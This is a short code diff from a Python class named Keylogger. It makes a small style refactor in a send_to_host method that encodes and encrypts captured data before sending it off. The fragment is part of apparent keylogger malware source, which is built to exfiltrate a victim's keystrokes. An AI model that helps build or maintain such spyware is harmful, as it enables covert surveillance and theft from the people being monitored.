@@ -128,7 +128,7 @@ class Keylogger:
                 print(e)
 
     def send_to_host(self, data: str | bytes, ftype:bytes):
-        if type(data) == str:
+        if isinstance(data, str):
             data = data.encode("utf-8")
         encrypted_data = utils.encrypt(data=data, ftype=ftype)
 
